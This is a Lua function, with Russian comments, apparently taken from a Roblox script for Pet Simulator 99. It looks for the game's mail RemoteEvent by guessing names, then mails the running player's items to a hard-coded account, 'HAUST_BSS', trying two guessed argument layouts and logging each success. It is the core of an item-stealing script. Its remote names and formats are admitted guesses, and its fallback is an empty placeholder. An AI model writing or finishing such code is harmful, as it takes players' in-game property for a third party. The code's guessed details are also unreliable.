-- === НОВАЯ ФУНКЦИЯ ОТПРАВКИ (как в ZapHub) ===
local function sendItemToMail(itemInstance, itemName)
    local sendCost = getActualSendCost()
    local balance = getDiamondBalance()

    if balance < sendCost then
        sendLog("❌ Недостаточно алмазов для отправки", false)
        return false
    end

    ---=== ПОИСК REMOTEEVENT ДЛЯ ПОЧТЫ ===---
    -- Список возможных названий RemoteEvent'ов в PS99 (нужно проверить и дополнить)
    local possibleRemoteNames = {
        "SendItemToMail", "MailEvent", "SendGift", "PackageEvent",
        "MailboxEvent", "GiftEvent", "TransferItem", "PostEvent"
    }

    local mailRemote = nil
    for _, remoteName in ipairs(possibleRemoteNames) do
        local remote = game:GetService("ReplicatedStorage"):FindFirstChild(remoteName)
        if remote and remote:IsA("RemoteEvent") then
            mailRemote = remote
            sendLog("📡 Найден RemoteEvent: " .. remoteName, false)
            break
        end
    end

    if not mailRemote then
        sendLog("❌ RemoteEvent для почты не найден!", false)
        return false
    end

    ---=== ФОРМИРОВАНИЕ АРГУМЕНТОВ ===---
    -- ВАЖНО: Формат аргументов может отличаться. Нужно подобрать правильный.
    -- Это самые частые варианты:

    -- Вариант 1: (имя предмета, получатель, сообщение)
    local args1 = {
        [1] = itemName,
        [2] = "HAUST_BSS", -- Жестко заданный ник
        [3] = MESSAGE_TEXT
    }

    -- Вариант 2: (ID предмета, получатель, количество)
    -- local itemId = itemInstance:GetAttribute("ItemID") -- или другой способ получить ID
    -- local args2 = { [1] = itemId, [2] = "HAUST_BSS", [3] = 1 }

    -- Вариант 3: (получатель, название предмета, сообщение)
    local args3 = {
        [1] = "HAUST_BSS",
        [2] = itemName,
        [3] = MESSAGE_TEXT
    }

    ---=== ПОПЫТКА ОТПРАВКИ С ЗАЩИТОЙ ===---
    local success = false
    local remoteErr = nil

    -- Пробуем первый вариант аргументов
    success, remoteErr = pcall(function()
        mailRemote:FireServer(unpack(args1))
    end)

    if not success then
        sendLog("⚠️ Вариант 1 не сработал, пробую вариант 3...", false)
        success, remoteErr = pcall(function()
            mailRemote:FireServer(unpack(args3))
        end)
    end

    -- Здесь можно добавить еще варианты, если нужно

    if success then
        sendLog("✅ УСПЕХ! Отправлен через Remote: **" .. itemName .. "** на HAUST_BSS", true)
        return true
    else
        sendLog("❌ Ошибка Remote: " .. tostring(remoteErr), false)
        sendLog("🖱️ Пробую отправить через интерфейс (старый метод)...", false)

        ---=== ЗАПАСНОЙ ВАРИАНТ: ОТПРАВКА ЧЕРЕЗ ИНТЕРФЕЙС ===---
        -- Вставь сюда старый код отправки через интерфейс, если хочешь оставить запасной вариант.
        -- (Сюда копируется старый код из функции sendItemToMail, который был раньше)

        return false -- Возвращаем false, если и запасной вариант не сработал
    end
end